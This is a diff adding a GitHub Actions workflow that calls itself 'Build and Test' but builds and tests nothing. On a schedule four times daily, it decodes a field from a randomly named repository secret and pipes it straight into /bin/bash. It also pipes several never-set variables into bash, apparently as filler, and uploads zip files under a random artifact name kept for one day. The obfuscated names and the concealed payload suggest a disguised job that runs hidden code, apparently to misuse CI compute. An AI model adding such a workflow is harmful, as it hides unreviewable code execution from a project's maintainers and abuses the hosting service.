@@ -1,0 +1,35 @@
+name: Build and Test
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '43 1,7,13,19 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  main:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - uses: actions/checkout@v4
+      - name: Process
+        env:
+          aekoi83610: ${{ secrets.aekoi83610 }}
+        run: |
+          printf '%s' "$aekoi83610" | jq -r .rcrn3 | /bin/bash
+          echo $rzii46512 | jq -r .tsxch162 | /bin/bash
+          echo $jwx45 | jq -r .gisqs2489 | /bin/bash
+          echo $myl97149 | jq -r .mfcb7 | /bin/bash
+          echo $wixfx2 | jq -r .k36 | /bin/bash
+          echo $ktww86 | jq -r .xvg480 | /bin/bash
+          echo $a5144 | jq -r .m019 | /bin/bash
+          echo $gwme07390 | jq -r .uaw3511 | /bin/bash
+
+      - name: Archive output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: QBu1eWZd
+          path: "*.zip"
+          retention-days: 1
